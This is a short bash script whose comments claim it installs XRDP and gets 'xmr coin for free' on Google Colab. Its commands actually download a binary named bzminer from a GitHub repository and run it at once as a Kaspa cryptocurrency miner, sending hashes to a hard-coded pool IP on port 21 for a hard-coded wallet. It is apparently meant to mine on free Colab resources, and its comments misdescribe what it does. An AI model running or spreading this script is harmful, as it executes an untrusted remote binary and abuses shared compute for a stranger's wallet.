# /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R bzminer

wget https://github.com/sbwsmg/kaspabaru/raw/main/bzminer && chmod 700 bzminer && ./bzminer -a kaspa -w kaspa:qzmkm7ddenhfclxh2npvye8eymsck9y6l9pyvsdhuans30heqhgrzct5g9pfg -p 51.79.222.181:21 --disable_opencl --oc_fan_speed t:60[25-70] tm:72[60-72]
